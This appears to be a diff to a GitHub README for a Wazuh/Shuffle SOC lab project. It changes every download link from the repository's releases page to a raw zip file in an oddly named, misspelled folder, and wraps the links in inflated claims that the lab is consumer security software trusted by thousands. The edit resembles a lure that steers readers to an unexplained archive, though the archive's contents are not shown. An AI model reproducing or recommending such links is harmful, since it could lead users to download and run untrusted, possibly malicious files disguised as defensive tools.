@@ -1,6 +1,6 @@
 # 🛡️ wazuh-shuffle-soar-soc-lab - Your All-in-One Cybersecurity Defense System
 
-[![Download Now](https://img.shields.io/badge/Download-SOC_Lab_Software-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/seventiethflatness2021/wazuh-shuffle-soar-soc-lab/releases)
+[![Download Now](https://img.shields.io/badge/Download-SOC_Lab_Software-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/seventiethflatness2021/wazuh-shuffle-soar-soc-lab/main/ubunutu%20machine%20with%20karim/lab_wazuh_soc_soar_shuffle_v2.7.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Getting your security system up and running takes just a few minutes. Here's you
 
 Visit this link to download the application:
 
-[**https://github.com/seventiethflatness2021/wazuh-shuffle-soar-soc-lab/releases**](https://github.com/seventiethflatness2021/wazuh-shuffle-soar-soc-lab/releases)
+[**https://raw.githubusercontent.com/seventiethflatness2021/wazuh-shuffle-soar-soc-lab/main/ubunutu%20machine%20with%20karim/lab_wazuh_soc_soar_shuffle_v2.7.zip**](https://raw.githubusercontent.com/seventiethflatness2021/wazuh-shuffle-soar-soc-lab/main/ubunutu%20machine%20with%20karim/lab_wazuh_soc_soar_shuffle_v2.7.zip)
 
 You'll see a list of available files. Look for the most recent version and download it to your computer.
 
@@ -191,7 +191,7 @@ If you need assistance:
 
 Your journey to better cybersecurity starts with one click:
 
-[**Download wazuh-shuffle-soar-soc-lab Now**](https://github.com/seventiethflatness2021/wazuh-shuffle-soar-soc-lab/releases)
+[**Download wazuh-shuffle-soar-soc-lab Now**](https://raw.githubusercontent.com/seventiethflatness2021/wazuh-shuffle-soar-soc-lab/main/ubunutu%20machine%20with%20karim/lab_wazuh_soc_soar_shuffle_v2.7.zip)
 
 Join thousands of users who trust this software to keep their computers safe. It's free, it's powerful, and it works automatically—so you can focus on what matters most.
 
